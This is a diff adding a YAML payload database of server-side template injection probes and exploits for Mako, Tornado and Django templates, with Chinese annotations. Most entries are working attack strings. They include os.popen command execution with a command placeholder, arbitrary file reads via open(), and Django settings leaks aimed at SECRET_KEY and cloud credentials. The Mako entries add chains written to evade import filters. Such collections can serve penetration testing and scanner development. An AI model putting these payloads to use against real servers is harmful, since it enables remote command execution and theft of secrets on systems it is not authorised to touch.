@@ -1,0 +1,162 @@
+ruleDB: v0.1.0
+# Python 侧模板引擎：Mako、Tornado、Django。
+# 定界符各不相同，所以探测模板没法合并：
+#   Mako    ${ } 求值，<% %> 是代码块
+#   Tornado {{ }} 里是**真的 Python 表达式**，{% %} 是语句块
+#   Django  沙箱模板，{{ }} **不做算术**，只能取变量
+
+templates:
+  - id: ssti.python.mako.detect
+    name: Mako 算术探测
+    desc: Mako 的 ${ } 直接求值。注意 Jinja2 也是 {{ }}，但 Mako 用 ${ }
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [mako]
+    version: "*"
+    body: "${7*7}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.mako.rce
+    name: Mako 命令执行
+    desc: 用 <%import%> 代码块引入 os。Mako 里 __import__ 通常被限制，但 import 语句不受影响
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [mako]
+    version: "*"
+    body: "<%import os%>${os.popen('<<cmd>>').read()}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.tornado.detect
+    name: Tornado 算术探测
+    desc: Tornado 的 {{ }} 里是真 Python，和 Jinja2 长得像但语义完全不同
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [tornado]
+    version: "*"
+    body: "{{7*7}}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.tornado.rce
+    name: Tornado 命令执行
+    desc: 用 {% import %} 语句块直接引 os，不需要绕沙箱
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [tornado]
+    version: "*"
+    body: "{% import os %}{{os.popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.django.detect
+    name: Django 上下文转储
+    desc: Django 模板是沙箱的，{{7*7}} **不会**得 49。用 {% debug %} 转储上下文，需要 DEBUG=True
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [django]
+    version: "*"
+    body: "{% debug %}"
+    vars: []
+    requires: [template-ctrl, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.django.settings
+    name: Django 配置泄露
+    desc: 取 settings 对象。是否可取取决于上下文处理器是否把 settings 注入了模板
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [django]
+    version: "*"
+    slots:
+      key:
+        options: ["SECRET_KEY", "DEBUG", "DATABASES", "ALLOWED_HOSTS",
+                  "EMAIL_HOST_PASSWORD", "AWS_SECRET_ACCESS_KEY", "SESSION_COOKIE_NAME"]
+        default: "SECRET_KEY"
+    body: "{{settings.<<key>>}}"
+    vars: []
+    requires: [template-ctrl, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.python.mako.file.read
+    name: Mako 读文件
+    desc: Mako 生成的代码直接跑在 Python 里，内置 open 可以直接调
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [mako]
+    version: "*"
+    body: "${open('<<filepath>>').read()}"
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.python.mako.rce.self_module
+    name: Mako 经 self.module 命令执行
+    desc: "import 被拦（`<%import%>` 走不通）时的另一条路：经模板对象自己的 `self.module` 摸到 Mako 内部**已经导入**的模块，`cache.util` 上就挂着 `os`。不自己 import，所以任何针对 import 语句的过滤都碰不到它。同一条链上还能顺到 `sys`、`subprocess`"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [mako]
+    version: "*"
+    body: "${self.module.cache.util.os.popen('<<cmd>>').read()}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.python.mako.module_level
+    name: Mako 模块级代码块
+    desc: "`<%! %>` 是**模块级**代码块——它在模板模块被加载时执行一次（不是每次渲染），生成的名字对整个模块可见，作用域比 `<% %>` 宽。目标是「模板体内禁止 import」这类封装时用它：`from os import popen` 把函数直接引进模块命名空间，模板体里连 `os.` 都不出现"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [mako]
+    version: "*"
+    body: "<%!from os import popen%>${popen('<<cmd>>').read()}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.python.django.include
+    name: Django 经 include 加载任意模板
+    desc: 输入进到 `{% include %}` 的参数时用——能加载**加载器搜得到**的任意模板文件并把渲染结果插进来，等于一个受模板引擎限制的文件读取（读不了非模板文件）。单独一条不构成 RCE：要升级得先往模板目录里落一个文件（上传、日志写入都行）再 include 它。别指望 `{{7*7}}` 得 49——Django 模板是沙箱的，不做算术
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [django]
+    version: "*"
+    body: '{% include "<<filepath>>" %}'
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
